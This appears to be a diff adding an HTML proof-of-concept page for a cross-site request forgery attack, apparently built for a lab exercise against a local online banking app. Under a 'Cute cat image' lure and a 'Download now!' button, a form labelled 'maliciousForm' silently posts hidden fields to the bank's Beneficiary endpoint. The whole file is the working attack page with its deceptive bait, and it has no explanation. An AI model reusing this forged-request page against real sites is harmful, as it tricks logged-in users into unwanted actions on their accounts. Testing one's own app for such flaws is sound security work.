@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        .center {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <div class="center">
+        <h1>Cute cat image</h1>
+        <form action="http://localhost:8080/OnlineBankingWebsite/Beneficiary" method="POST" id="maliciousForm">
+            <img src="https://i.ibb.co/NjdW080/cat.jpg" style="width:200px; height:400px;"/><br>
+            <input type="hidden" name="action" value="findContacts"/>
+            <input type="hidden" name="parameter" value="a"/>
+            <button type="submit" style="display: block; margin: 0 auto;">Download now!</button> 
+        </form>
+    </div>
+</body>
+</html>
